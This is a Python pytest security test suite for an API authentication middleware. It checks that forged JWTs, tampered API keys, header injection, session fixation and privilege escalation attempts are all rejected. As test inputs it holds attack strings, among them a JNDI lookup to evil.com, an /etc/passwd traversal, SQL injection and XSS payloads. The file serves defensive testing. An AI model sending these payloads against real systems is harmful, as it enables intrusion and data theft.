"""Authentication bypass attempt security tests.

This module provides comprehensive security testing for authentication bypass
attempts against the API key validation infrastructure. Tests cover various
attack vectors including JWT manipulation, API key forgery, header injection,
and session management vulnerabilities.

Based on OWASP ASVS authentication testing guidelines and modern security
best practices for API authentication systems.
"""

import base64
import contextlib
import json
import time
from unittest.mock import AsyncMock, Mock, patch

import jwt
import pytest
from fastapi import FastAPI, HTTPException, Request
from fastapi.testclient import TestClient

from tripsage.api.middlewares.authentication import (
    AuthenticationMiddleware,
    Principal,
)


class TestJWTBypassAttempts:
    """Test suite for JWT authentication bypass attempts."""

    @pytest.fixture
    def valid_jwt_secret(self) -> str:
        """Valid JWT secret for testing."""
        return "test-jwt-secret-key-for-authentication-bypass-testing"

    @pytest.fixture
    def test_app(self) -> FastAPI:
        """Test FastAPI application with authentication middleware."""
        app = FastAPI()

        @app.get("/protected")
        async def protected_endpoint(request: Request):
            principal = getattr(request.state, "principal", None)
            if not principal:
                raise HTTPException(status_code=401, detail="Not authenticated")
            return {"message": "success", "user_id": principal.id}

        @app.get("/public")
        async def public_endpoint():
            return {"message": "public"}

        return app

    @pytest.fixture
    def test_client_with_auth(self, test_app, valid_jwt_secret) -> TestClient:
        """Test client with authentication middleware."""
        with patch("tripsage.api.core.config.get_settings") as mock_settings:
            mock_return = (
                mock_settings.return_value.database_jwt_secret.get_secret_value
            )
            mock_return.return_value = valid_jwt_secret

            middleware = AuthenticationMiddleware(test_app)
            test_app.add_middleware(
                type(middleware).__bases__[0], dispatch=middleware.dispatch
            )

            return TestClient(test_app)

    @pytest.fixture
    def valid_jwt_token(self, valid_jwt_secret) -> str:
        """Generate a valid JWT token for testing."""
        payload = {
            "sub": "user_123",
            "email": "test@example.com",
            "role": "authenticated",
            "aud": "authenticated",
            "exp": int(time.time()) + 3600,  # 1 hour from now
            "iat": int(time.time()),
        }
        return jwt.encode(payload, valid_jwt_secret, algorithm="HS256")

    def test_jwt_none_algorithm_attack(self, test_client_with_auth, valid_jwt_secret):
        """Test JWT 'none' algorithm bypass attempt."""
        # Create token with 'none' algorithm (no signature)
        payload = {
            "sub": "attacker_123",
            "email": "attacker@evil.com",
            "role": "admin",
            "aud": "authenticated",
            "exp": int(time.time()) + 3600,
        }

        # Manually create JWT with 'none' algorithm
        header = {"alg": "none", "typ": "JWT"}
        header_encoded = (
            base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        )
        payload_encoded = (
            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        )

        malicious_token = f"{header_encoded}.{payload_encoded}."

        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {malicious_token}"}
        )

        # Should reject 'none' algorithm
        assert response.status_code == 401

    def test_jwt_algorithm_confusion_attack(
        self, test_client_with_auth, valid_jwt_secret
    ):
        """Test JWT algorithm confusion attack (HS256 vs RS256)."""
        # Try to use HMAC with public key as secret
        payload = {
            "sub": "attacker_123",
            "email": "attacker@evil.com",
            "role": "admin",
            "aud": "authenticated",
            "exp": int(time.time()) + 3600,
        }

        # Create token with RS256 algorithm but using HMAC
        with contextlib.suppress(ValueError, TypeError):
            malicious_token = jwt.encode(payload, valid_jwt_secret, algorithm="RS256")

        # Try HS512 instead of HS256
        malicious_token = jwt.encode(payload, valid_jwt_secret, algorithm="HS512")

        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {malicious_token}"}
        )

        # Should reject different algorithm
        assert response.status_code == 401

    def test_jwt_signature_manipulation(self, test_client_with_auth, valid_jwt_token):
        """Test JWT signature manipulation attacks."""
        # Split the valid token
        parts = valid_jwt_token.split(".")
        header, payload, signature = parts

        # Test 1: Remove signature
        token_no_sig = f"{header}.{payload}."
        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {token_no_sig}"}
        )
        assert response.status_code == 401

        # Test 2: Modify signature
        malicious_signature = (
            base64.urlsafe_b64encode(b"malicious").decode().rstrip("=")
        )
        token_bad_sig = f"{header}.{payload}.{malicious_signature}"
        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {token_bad_sig}"}
        )
        assert response.status_code == 401

        # Test 3: Use signature from different token
        other_payload = {"sub": "other_user", "exp": int(time.time()) + 3600}
        other_payload_encoded = (
            base64.urlsafe_b64encode(json.dumps(other_payload).encode())
            .decode()
            .rstrip("=")
        )
        token_mixed_sig = f"{header}.{other_payload_encoded}.{signature}"
        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {token_mixed_sig}"}
        )
        assert response.status_code == 401

    def test_jwt_payload_manipulation(self, test_client_with_auth, valid_jwt_secret):
        """Test JWT payload manipulation attacks."""
        base_payload = {
            "sub": "user_123",
            "email": "test@example.com",
            "role": "user",
            "aud": "authenticated",
            "exp": int(time.time()) + 3600,
        }

        # Test privilege escalation attempts
        malicious_payloads = [
            {**base_payload, "role": "admin"},
            {**base_payload, "sub": "admin"},
            {**base_payload, "permissions": ["admin", "delete_all"]},
            {**base_payload, "is_admin": True},
            {**base_payload, "user_id": "1"},  # Try to become user 1
            {**base_payload, "exp": int(time.time()) + 86400 * 365},  # 1 year expiry
        ]

        for malicious_payload in malicious_payloads:
            token = jwt.encode(malicious_payload, valid_jwt_secret, algorithm="HS256")
            response = test_client_with_auth.get(
                "/protected", headers={"Authorization": f"Bearer {token}"}
            )

            # Should accept valid signature but may reject based on payload validation
            # The key is that it shouldn't grant elevated privileges
            if response.status_code == 200:
                data = response.json()
                # Should not grant admin privileges based on manipulated payload
                assert "admin" not in str(data).lower()

    def test_jwt_timing_attack_resistance(
        self, test_client_with_auth, valid_jwt_secret
    ):
        """Test JWT verification timing attack resistance."""
        valid_payload = {
            "sub": "user_123",
            "email": "test@example.com",
            "aud": "authenticated",
            "exp": int(time.time()) + 3600,
        }

        # Create tokens with different signature validity
        valid_token = jwt.encode(valid_payload, valid_jwt_secret, algorithm="HS256")
        invalid_token = jwt.encode(valid_payload, "wrong_secret", algorithm="HS256")

        # Measure timing for valid vs invalid tokens
        valid_times = []
        invalid_times = []

        for _ in range(10):
            # Time valid token
            start = time.time()
            test_client_with_auth.get(
                "/protected", headers={"Authorization": f"Bearer {valid_token}"}
            )
            end = time.time()
            valid_times.append(end - start)

            # Time invalid token
            start = time.time()
            test_client_with_auth.get(
                "/protected", headers={"Authorization": f"Bearer {invalid_token}"}
            )
            end = time.time()
            invalid_times.append(end - start)

        # Timing difference should not be significant
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        time_ratio = max(avg_valid, avg_invalid) / min(avg_valid, avg_invalid)

        # Should not have timing attack vulnerability
        assert time_ratio < 5.0, (
            f"Potential timing attack vulnerability: {time_ratio:.2f}x difference"
        )

    def test_jwt_expired_token_attacks(self, test_client_with_auth, valid_jwt_secret):
        """Test attacks with expired JWT tokens."""
        # Create expired token
        expired_payload = {
            "sub": "user_123",
            "email": "test@example.com",
            "aud": "authenticated",
            "exp": int(time.time()) - 3600,  # Expired 1 hour ago
            "iat": int(time.time()) - 7200,  # Issued 2 hours ago
        }

        expired_token = jwt.encode(expired_payload, valid_jwt_secret, algorithm="HS256")

        # Should reject expired token
        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {expired_token}"}
        )
        assert response.status_code == 401

        # Test token with future iat (issued in future)
        future_payload = {
            "sub": "user_123",
            "email": "test@example.com",
            "aud": "authenticated",
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()) + 300,  # Issued 5 minutes in future
        }

        future_token = jwt.encode(future_payload, valid_jwt_secret, algorithm="HS256")

        # May or may not reject future iat depending on implementation
        response = test_client_with_auth.get(
            "/protected", headers={"Authorization": f"Bearer {future_token}"}
        )
        # Behavior may vary - key is no crashes or unexpected access

    def test_jwt_malformed_token_attacks(self, test_client_with_auth):
        """Test attacks with malformed JWT tokens."""
        malformed_tokens = [
            "not.a.jwt",
            "too.few.parts",
            "too.many.parts.here.invalid",
            "invalid_base64.invalid_base64.invalid_base64",
            "..",  # Empty parts
            "header.payload.",  # Missing signature
            "Bearer malformed_token",  # Wrong format
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",  # Only header
            "",  # Empty token
            "null",
            "undefined",
            "<script>alert('xss')</script>",
            "' OR '1'='1",  # SQL injection attempt
            "\x00\x01\x02",  # Binary data
            "a" * 10000,  # Very long token
        ]

        for malformed_token in malformed_tokens:
            response = test_client_with_auth.get(
                "/protected", headers={"Authorization": f"Bearer {malformed_token}"}
            )

            # Should reject malformed tokens without crashing
            assert response.status_code == 401
            # Should not leak sensitive information in error message
            error_text = response.text.lower()
            assert "secret" not in error_text
            assert "key" not in error_text


class TestAPIKeyBypassAttempts:
    """Test suite for API key authentication bypass attempts."""

    @pytest.fixture
    def test_app_with_api_key_auth(self) -> FastAPI:
        """Test app with API key authentication."""
        app = FastAPI()

        @app.get("/api-protected")
        async def api_protected_endpoint(request: Request):
            principal = getattr(request.state, "principal", None)
            if not principal or principal.type != "agent":
                raise HTTPException(status_code=401, detail="API key required")
            return {"message": "api success", "agent_id": principal.id}

        return app

    @pytest.fixture
    def test_client_with_api_key_auth(self, test_app_with_api_key_auth) -> TestClient:
        """Test client with API key authentication."""
        with patch(
            "tripsage_core.services.business.key_management_service.get_key_management_service"
        ):
            middleware = AuthenticationMiddleware(test_app_with_api_key_auth)
            test_app_with_api_key_auth.add_middleware(
                type(middleware).__bases__[0], dispatch=middleware.dispatch
            )

            return TestClient(test_app_with_api_key_auth)

    @pytest.fixture
    def mock_key_service(self):
        """Mock key management service."""
        service = AsyncMock()
        service.validate_api_key.return_value = Mock(
            is_valid=True, message="Valid key", details={"service": "openai"}
        )
        return service

    def test_api_key_format_bypass_attempts(self, test_client_with_api_key_auth):
        """Test API key format bypass attempts."""
        malicious_api_keys = [
            # Format manipulation attempts
            "sk_openai_123_secret; DROP TABLE api_keys; --",
            "sk_openai_123_secret' OR '1'='1",
            "sk_openai_123_secret<script>alert('xss')</script>",
            "sk_openai_123_secret\x00null_byte",
            "sk_openai_123_secret\n\rcontrol_chars",
            "sk_openai_123_secret||true",
            # Structure manipulation
            "sk_openai_123_",  # Missing secret part
            "sk__123_secret",  # Missing service
            "sk_openai__secret",  # Missing key ID
            "_openai_123_secret",  # Missing sk prefix
            "sk_openai_123_secret_extra_parts",
            # Encoding attempts
            "c2tfb3BlbmFpXzEyM19zZWNyZXQ=",  # Base64 encoded
            # URL encoded
            "%73%6b%5f%6f%70%65%6e%61%69%5f%31%32%33%5f%73%65%63%72%65%74",
            "sk%5Fopenai%5F123%5Fsecret",  # Partially URL encoded
            # Length manipulation
            "sk_openai_123_" + "a" * 1000,  # Very long secret
            "sk_a_b_c",  # Very short
            "",  # Empty
            # Special characters
            "sk_openai_123_secret!@#$%^&*()",
            "sk_openai_123_secret/../../../etc/passwd",
            "sk_openai_123_secret${jndi:ldap://evil.com}",
        ]

        for malicious_key in malicious_api_keys:
            response = test_client_with_api_key_auth.get(
                "/api-protected", headers={"X-API-Key": malicious_key}
            )

            # Should reject malformed API keys
            assert response.status_code == 401
            # Should not crash or leak information
            error_text = response.text.lower()
            assert "secret" not in error_text
            assert "database" not in error_text

    def test_api_key_header_injection_attacks(self, test_client_with_api_key_auth):
        """Test API key header injection attacks."""
        # Test various header injection attempts
        injection_headers = [
            {"X-API-Key": "sk_openai_123_secret\r\nX-Admin: true"},
            {"X-API-Key": "sk_openai_123_secret\nAuthorization: Bearer admin_token"},
            {"X-API-Key": "sk_openai_123_secret\r\n\r\n<script>alert('xss')</script>"},
            {
                "X-API-Key": "sk_openai_123_secret",
                "X-API-Key-Backup": "sk_admin_999_backdoor",
            },
            {"x-api-key": "sk_openai_123_secret"},  # Case sensitivity
            {"X-Api-Key": "sk_openai_123_secret"},  # Different case
            {"X_API_KEY": "sk_openai_123_secret"},  # Underscore instead of dash
        ]

        for headers in injection_headers:
            response = test_client_with_api_key_auth.get(
                "/api-protected", headers=headers
            )

            # Should handle header variations securely
            assert response.status_code == 401

    def test_api_key_replay_attack_simulation(
        self, test_client_with_api_key_auth, mock_key_service
    ):
        """Test API key replay attack scenarios."""
        with patch(
            "tripsage_core.services.business.key_management_service.get_key_management_service",
            return_value=mock_key_service,
        ):
            valid_api_key = "sk_openai_123_valid_secret"

            # Simulate successful request
            response1 = test_client_with_api_key_auth.get(
                "/api-protected", headers={"X-API-Key": valid_api_key}
            )

            # Simulate replay attack (same key, different time)
            time.sleep(0.1)
            _response2 = test_client_with_api_key_auth.get(
                "/api-protected", headers={"X-API-Key": valid_api_key}
            )

            # Basic replay should work (API keys are stateless)
            # But implementation might have replay protection
            if response1.status_code == 200:
                # If first request succeeded, replay protection depends on
                # implementation
                pass

    def test_api_key_concurrent_usage_attacks(self, test_client_with_api_key_auth):
        """Test concurrent API key usage attacks."""
        import threading

        valid_api_key = "sk_openai_123_valid_secret"
        results = []

        def make_request():
            response = test_client_with_api_key_auth.get(
                "/api-protected", headers={"X-API-Key": valid_api_key}
            )
            results.append(response.status_code)

        # Simulate concurrent requests with same API key
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Should handle concurrent usage gracefully
        # All should either succeed or fail consistently
        unique_codes = set(results)
        assert len(unique_codes) <= 2  # Should not have inconsistent behavior


class TestAuthenticationHeaderManipulation:
    """Test suite for authentication header manipulation attacks."""

    @pytest.fixture
    def test_client_full_auth(self) -> TestClient:
        """Test client with full authentication middleware."""
        app = FastAPI()

        @app.get("/protected")
        async def protected_endpoint(request: Request):
            principal = getattr(request.state, "principal", None)
            if not principal:
                raise HTTPException(status_code=401, detail="Not authenticated")
            return {"user_id": principal.id, "type": principal.type}

        middleware = AuthenticationMiddleware(app)
        app.add_middleware(type(middleware).__bases__[0], dispatch=middleware.dispatch)

        return TestClient(app)

    def test_authorization_header_case_sensitivity(self, test_client_full_auth):
        """Test authorization header case sensitivity attacks."""
        token = "valid_jwt_token_here"

        # Test various case combinations
        case_variations = [
            {"authorization": f"Bearer {token}"},  # lowercase
            {"AUTHORIZATION": f"Bearer {token}"},  # uppercase
            {"Authorization": f"bearer {token}"},  # lowercase bearer
            {"Authorization": f"BEARER {token}"},  # uppercase bearer
            {"Authorization": f"BeArEr {token}"},  # mixed case bearer
            {"AuThOrIzAtIoN": f"Bearer {token}"},  # mixed case header
        ]

        for headers in case_variations:
            response = test_client_full_auth.get("/protected", headers=headers)
            # Should handle case consistently
            assert response.status_code == 401  # Expected since token is not valid

    def test_multiple_authorization_headers(self, test_client_full_auth):
        """Test multiple authorization headers attack."""
        # Test multiple Authorization headers
        # HTTP spec allows multiple headers, but auth should be unambiguous

        # FastAPI/Starlette typically uses the last value
        response = test_client_full_auth.get(
            "/protected",
            headers=[
                ("Authorization", "Bearer malicious_token"),
                ("Authorization", "Bearer valid_token"),
            ],
        )

        # Should handle multiple headers securely
        assert response.status_code == 401

    def test_authorization_header_injection(self, test_client_full_auth):
        """Test authorization header injection attacks."""
        injection_attempts = [
            "Bearer token\r\nX-Admin: true",
            "Bearer token\nAuthorization: Bearer admin_token",
            "Bearer token\r\n\r\n<script>alert('xss')</script>",
            "Bearer token; X-Role=admin",
            "Bearer token\x00null_byte_injection",
            "Bearer token\x0d\x0aSet-Cookie: admin=true",
        ]

        for malicious_auth in injection_attempts:
            response = test_client_full_auth.get(
                "/protected", headers={"Authorization": malicious_auth}
            )

            # Should not be vulnerable to header injection
            assert response.status_code == 401
            # Should not set malicious headers/cookies
            assert "admin" not in response.headers.get("Set-Cookie", "")

    def test_suspicious_header_patterns_detection(self, test_client_full_auth):
        """Test detection of suspicious header patterns."""
        suspicious_headers = [
            {"User-Agent": "<script>alert('xss')</script>"},
            {"Referer": "javascript:alert('xss')"},
            {"X-Custom-Header": "'; DROP TABLE users; --"},
            {"Accept": "application/json\x00null_byte"},
            {"Content-Type": "../../../etc/passwd"},
            {"X-Forwarded-For": "UNION SELECT password FROM users"},
        ]

        for headers in suspicious_headers:
            response = test_client_full_auth.get("/protected", headers=headers)

            # Should detect and handle suspicious patterns
            # May either reject or sanitize
            assert response.status_code in [400, 401]

    def test_header_size_limits(self, test_client_full_auth):
        """Test protection against oversized headers."""
        # Very large header name
        large_header_name = "X-" + "A" * 1000
        response = test_client_full_auth.get(
            "/protected", headers={large_header_name: "value"}
        )
        assert response.status_code in [
            400,
            413,
            431,
        ]  # Bad request or header too large

        # Very large header value
        large_header_value = "B" * 10000
        response = test_client_full_auth.get(
            "/protected", headers={"X-Large-Header": large_header_value}
        )
        assert response.status_code in [400, 413, 431]

        # Many headers (header count DoS)
        many_headers = {f"X-Header-{i}": f"value_{i}" for i in range(1000)}
        response = test_client_full_auth.get("/protected", headers=many_headers)
        # Should handle gracefully without DoS
        assert response.status_code in [400, 413, 431]


class TestSessionManipulationAttacks:
    """Test suite for session manipulation and fixation attacks."""

    @pytest.fixture
    def test_app_with_sessions(self) -> FastAPI:
        """Test app with session handling."""
        app = FastAPI()

        @app.post("/login")
        async def login(request: Request):
            # Simulate login endpoint
            # In real app, would validate credentials and create session
            principal = Principal(
                id="user_123",
                type="user",
                email="test@example.com",
                auth_method="session",
            )
            request.state.principal = principal
            return {"message": "logged in", "session_id": "session_123"}

        @app.get("/profile")
        async def profile(request: Request):
            principal = getattr(request.state, "principal", None)
            if not principal:
                raise HTTPException(status_code=401, detail="Not authenticated")
            return {"user_id": principal.id, "email": principal.email}

        return app

    def test_session_fixation_attack(self, test_app_with_sessions):
        """Test session fixation attack scenarios."""
        client = TestClient(test_app_with_sessions)

        # Attacker provides session ID before login
        malicious_session_id = "attacker_controlled_session_123"

        # Login with attacker-controlled session
        response = client.post("/login", cookies={"session_id": malicious_session_id})

        # Should not use attacker-provided session ID
        # Implementation should generate new session ID after login
        if "Set-Cookie" in response.headers:
            set_cookie = response.headers["Set-Cookie"]
            assert malicious_session_id not in set_cookie

    def test_session_id_prediction_resistance(self, test_app_with_sessions):
        """Test session ID prediction resistance."""
        client = TestClient(test_app_with_sessions)

        # Generate multiple sessions and check for patterns
        session_ids = []
        for _ in range(10):
            response = client.post("/login")
            if response.status_code == 200:
                data = response.json()
                if "session_id" in data:
                    session_ids.append(data["session_id"])

        # Session IDs should not be predictable
        if len(session_ids) >= 2:
            # Should not be sequential
            assert session_ids[0] != session_ids[1]
            # Should not have obvious patterns
            for session_id in session_ids:
                assert len(session_id) > 10  # Should be sufficiently long
                assert not session_id.isdigit()  # Should not be just numbers

    def test_cookie_security_attributes(self, test_app_with_sessions):
        """Test cookie security attributes."""
        client = TestClient(test_app_with_sessions)

        response = client.post("/login")

        if "Set-Cookie" in response.headers:
            cookie_header = response.headers["Set-Cookie"]

            # Should set secure cookie attributes
            assert "HttpOnly" in cookie_header or "httponly" in cookie_header.lower()
            assert "Secure" in cookie_header or "secure" in cookie_header.lower()
            assert "SameSite" in cookie_header or "samesite" in cookie_header.lower()


class TestPrivilegeEscalationAttempts:
    """Test suite for privilege escalation attacks."""

    @pytest.fixture
    def test_app_with_roles(self) -> FastAPI:
        """Test app with role-based access control."""
        app = FastAPI()

        @app.get("/user/profile")
        async def user_profile(request: Request):
            principal = getattr(request.state, "principal", None)
            if not principal:
                raise HTTPException(status_code=401, detail="Not authenticated")
            return {"user_id": principal.id, "role": getattr(principal, "role", "user")}

        @app.get("/admin/users")
        async def admin_users(request: Request):
            principal = getattr(request.state, "principal", None)
            if not principal:
                raise HTTPException(status_code=401, detail="Not authenticated")

            # Check admin role
            role = getattr(principal, "role", "user")
            if role != "admin":
                raise HTTPException(status_code=403, detail="Admin access required")

            return {"users": ["user1", "user2"], "admin": principal.id}

        return app

    def test_role_manipulation_in_jwt(self, test_app_with_roles):
        """Test role manipulation in JWT tokens."""
        app = test_app_with_roles

        with patch("tripsage.api.core.config.get_settings") as mock_settings:
            mock_return = (
                mock_settings.return_value.database_jwt_secret.get_secret_value
            )
            mock_return.return_value = "test_secret"

            middleware = AuthenticationMiddleware(app)
            app.add_middleware(
                type(middleware).__bases__[0], dispatch=middleware.dispatch
            )

            client = TestClient(app)

            # Create token with admin role
            admin_payload = {
                "sub": "user_123",
                "email": "test@example.com",
                "role": "admin",  # Privilege escalation attempt
                "aud": "authenticated",
                "exp": int(time.time()) + 3600,
            }

            admin_token = jwt.encode(admin_payload, "test_secret", algorithm="HS256")

            response = client.get(
                "/admin/users", headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should not grant admin access based on JWT role claim alone
            # Implementation should validate roles through proper authorization
            assert response.status_code in [401, 403]

    def test_parameter_pollution_privilege_escalation(self, test_app_with_roles):
        """Test privilege escalation via parameter pollution."""
        client = TestClient(test_app_with_roles)

        # Test various parameter pollution attempts
        pollution_attempts = [
            "/user/profile?role=admin",
            "/user/profile?user_id=admin&user_id=user_123",
            "/admin/users?bypass=true",
            "/admin/users?role[]=admin",
            "/admin/users?auth=skip",
        ]

        for attempt_url in pollution_attempts:
            response = client.get(attempt_url)

            # Should not grant unauthorized access
            assert response.status_code in [401, 403, 404]


class TestInformationDisclosureViaAuthentication:
    """Test suite for information disclosure through authentication mechanisms."""

    def test_user_enumeration_via_error_messages(self, test_client_with_auth):
        """Test user enumeration via authentication error messages."""
        # Test with valid vs invalid user emails
        test_emails = [
            "valid@example.com",
            "invalid@example.com",
            "admin@example.com",
            "test@example.com",
        ]

        error_messages = []
        response_times = []

        for email in test_emails:
            # Create JWT with different emails
            payload = {
                "sub": "user_123",
                "email": email,
                "aud": "authenticated",
                "exp": int(time.time()) + 3600,
            }

            # Use wrong secret to trigger error
            token = jwt.encode(payload, "wrong_secret", algorithm="HS256")

            start_time = time.time()
            response = test_client_with_auth.get(
                "/protected", headers={"Authorization": f"Bearer {token}"}
            )
            end_time = time.time()

            error_messages.append(response.text)
            response_times.append(end_time - start_time)

        # Error messages should not vary based on user existence
        unique_messages = set(error_messages)
        assert len(unique_messages) <= 2, "Error messages may reveal user existence"

        # Response times should not vary significantly
        max_time = max(response_times)
        min_time = min(response_times)
        time_ratio = max_time / min_time if min_time > 0 else 1
        assert time_ratio < 3, "Response timing may reveal user existence"

    def test_sensitive_data_in_error_responses(self, test_client_with_auth):
        """Test for sensitive data leakage in error responses."""
        malicious_tokens = [
            "invalid.jwt.token",
            jwt.encode({"sub": "test"}, "wrong_secret", algorithm="HS256"),
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid_payload.signature",
        ]

        for token in malicious_tokens:
            response = test_client_with_auth.get(
                "/protected", headers={"Authorization": f"Bearer {token}"}
            )

            error_text = response.text.lower()

            # Should not leak sensitive information
            sensitive_terms = [
                "secret",
                "key",
                "password",
                "database",
                "config",
                "internal",
                "debug",
                "trace",
                "stack",
                "exception",
            ]

            for term in sensitive_terms:
                assert term not in error_text, (
                    f"Error response may leak sensitive info: {term}"
                )

    def test_authentication_state_information_leakage(self, test_client_with_auth):
        """Test for authentication state information leakage."""
        # Test different authentication states
        test_cases = [
            (None, "No authorization header"),
            ("", "Empty authorization header"),
            ("Bearer", "Bearer without token"),
            ("Bearer ", "Bearer with empty token"),
            ("Basic dGVzdDp0ZXN0", "Basic auth instead of Bearer"),
            ("Bearer invalid", "Invalid token format"),
        ]

        for auth_header, _description in test_cases:
            headers = {}
            if auth_header is not None:
                headers["Authorization"] = auth_header

            response = test_client_with_auth.get("/protected", headers=headers)

            # All should return 401 without leaking state information
            assert response.status_code == 401

            # Error message should not reveal internal authentication state
            error_text = response.text.lower()
            internal_terms = ["middleware", "jwt", "decode", "verify", "parse"]
            for term in internal_terms:
                assert term not in error_text, f"Response leaks internal state: {term}"
